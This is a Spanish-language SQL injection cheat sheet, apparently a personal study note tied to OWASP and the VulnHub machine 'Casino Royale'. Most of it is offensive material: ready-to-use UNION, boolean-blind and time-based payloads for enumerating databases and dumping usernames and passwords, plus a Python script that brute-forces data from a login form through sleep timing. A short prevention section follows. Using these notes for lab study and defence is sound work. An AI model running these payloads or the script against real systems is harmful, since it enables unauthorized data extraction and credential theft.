---
Tema: "[[OWASP]]"
---
# 💉 SQL Injection (SQLi) - Cheat Sheet

> [!danger] ¿Qué es una inyección SQL?
> 
> Es una vulnerabilidad web que ocurre cuando los _inputs_ del usuario no se sanitizan, permitiendo al atacante inyectar **código SQL malicioso**. Esto permite evadir autenticaciones, extraer datos sensibles o manipular la base de datos entera.

> [!abstract] Tipos de Bases de Datos Vulnerables
> 
> - **Relacionales (Más comunes):** MySQL, PostgreSQL, SQL Server.
>     
> - **NoSQL / Grafos / Objetos:** MongoDB, Neo4j, db4o (Vulnerables a inyecciones específicas de su propio lenguaje/comandos).
>     

---

## 🛠️ La Caja de Herramientas (Funciones Clave)

Antes de empezar a inyectar, estas son las funciones vitales que te van a permitir extraer datos, especialmente en ataques a ciegas (_Blind_).

> [!tip] Funciones de Extracción y Lógica
> 
> - **`SUBSTR(cadena, inicio, longitud)`**: Extrae un fragmento de texto. Vital para ir sacando información carácter por carácter en ataques _Blind_.
>     
> - **`IF(condición, valor_si_verdadero, valor_si_falso)`**: Evalúa una condición. Ideal para inyecciones basadas en tiempo (ej: si acierto la letra, dormí la base de datos 3 segundos).
>     
> - **`GROUP_CONCAT(columna)`**: Agrupa múltiples filas de resultados en una sola cadena separada por comas. Es magia pura para extraer toda una tabla en una sola petición.
>     

### 🔍 Identificar la Base de Datos Actual

Dependiendo del motor, el comando cambia:

|**Motor de Base de Datos**|**Comando / Consulta para ver BD actual**|
|---|---|
|**MySQL / MariaDB**|`SELECT DATABASE();`|
|**PostgreSQL**|`SELECT current_database();`|
|**SQL Server**|`SELECT DB_NAME();`|

---

## 🗺️ Flujo de Trabajo Típico (Metodología)

Cuando confirmás la vulnerabilidad, el camino hacia el volcado de datos (dump) siempre sigue este flujo lógico:

Fragmento de código

```
graph TD
    A[1. Conocer BD Actual] --> B[2. Enumerar TODAS las BDs]
    B --> C[3. Enumerar TABLAS de una BD objetivo]
    C --> D[4. Enumerar COLUMNAS de una Tabla]
    D --> E[5. Volcar DATOS de las columnas]
    
    style A fill:#1e1e1e,stroke:#4CAF50,stroke-width:2px,color:#fff
    style B fill:#1e1e1e,stroke:#2196F3,stroke-width:2px,color:#fff
    style C fill:#1e1e1e,stroke:#FF9800,stroke-width:2px,color:#fff
    style D fill:#1e1e1e,stroke:#9C27B0,stroke-width:2px,color:#fff
    style E fill:#1e1e1e,stroke:#F44336,stroke-width:2px,color:#fff
```

### 💻 Consultas Clave (Paylods de Extracción)

Acá tenés las consultas exactas usando `GROUP_CONCAT` para sacar mucha info de un solo golpe (ideal para ataques basados en errores o UNION):

**1. Enumerar TODAS las Bases de Datos:**

```sql
SELECT group_concat(schema_name) FROM information_schema.schemata
```

**2. Enumerar TABLAS de una Base de Datos específica (ej. 'pokerleague'):**

```sql
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='pokerleague'
```

**3. Enumerar COLUMNAS de una Tabla específica (ej. 'pokermax_admin'):**

```sql
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='pokerleague' AND table_name='pokermax_admin'
```

**4. Extraer los DATOS (Ej: username y password separados por `:` que en hexa es `0x3a`):**

```sql
SELECT group_concat(username,0x3a,password) FROM pokermax_admin
```

---

## 💥 Tipos de Inyección y Ejemplos Prácticos

### 1. Error-Based & UNION-Based

Se usa cuando podés ver la respuesta de la base de datos reflejada en la pantalla.

> [!example] Ejemplos de Inyección (Parámetro GET)
> 
> - **Sacar DBs:** `?id=12232' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -`
>     
> - **Sacar Tablas:** `?id=12232' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='hack'-- -`
>     
> - **Sacar Columnas:** `?id=12232' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='hack' AND table_name='users'-- -`
>     

### 2. Boolean-Based Blind

Se usa cuando vas a ciegas. La web no te muestra errores, pero cambia su comportamiento (ej. muestra "Usuario encontrado" vs "No encontrado") según si la consulta es _True_ o _False_.

```sql
-- Pregunta: ¿El primer carácter del firstname del usuario 1 es la letra 'a' (ascii 97)?
SELECT (SELECT ascii(substring(firstname,1,1)) FROM scientist WHERE id=1)=97;
-- Devuelve 1 (True) o 0 (False)
```

### 3. Time-Based Blind

La web es estática y no cambia en nada. Le pedimos a la base de datos que "espere" (`sleep`) si acertamos la condición.

> [!warning] OJO
> 
> Para que el `sleep` se ejecute, a veces la consulta original debe ser verdadera (ej: usar un `id` que exista).

```sql
?id=1' AND IF(ascii(substr(database(),1,1))=104, sleep(3), 1)-- -
```

---

## 🤖 Automatización con Python (Time-Based Blind)

_(Basado en el caso de la maquina CASINO ROYALE de VulnHub)_

Cuando vas a ciegas, hacerlo a mano es imposible. Este es el _core_ del script en Python usando la librería `requests` para iterar posición por posición y carácter por carácter.

**Estructura del Payload inyectado:**

```python
# Payload típico inyectado en un campo de login ("username")
payload = "admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)-- -" % (position, character)
```

**Bucle de fuerza bruta (Script de ejemplo):**

```Python
import requests
import time
from pwn import *

main_url = "http://target.com/login"
caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,-:@"
datos_extraidos = ""

p1 = log.progress("Iniciando inyección SQL")
p2 = log.progress("Datos")

for position in range(1, 100):
    for character in caracteres:
        post_data = {
            'op': 'adminlogin',
            # Cambiar la consulta interna según qué queramos enumerar (DBs, Tablas, Columnas, Datos)
            'username': "admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
            'password': 'admin'
        }
        
        time_start = time.time()
        r = requests.post(main_url, data=post_data)
        time_end = time.time()
        
        # Si la respuesta tardó más de 0.85 segs, ¡acertamos el carácter!
        if time_end - time_start > 0.85:
            datos_extraidos += character
            p2.status(datos_extraidos)
            break # Pasamos a la siguiente posición
```

---

## 🛡️ Prevención (Para Blue Team)

- **Consultas Preparadas (Prepared Statements):** Es la solución definitiva. Separa el código SQL de los datos proporcionados por el usuario.
    
- **Validación y Sanitización:** Limpiar inputs (aunque no reemplaza a las consultas preparadas).
    
- **Evitar la concatenación dinámica:** Nunca construir consultas usando strings directos (`"SELECT * FROM users WHERE user = '" + input + "'"`).
    

---

**🔗 Recursos Adicionales:**
- [MySQL Online (ExtendsClass) para practicar sintaxis](https://extendsclass.com/mysql-online.html)
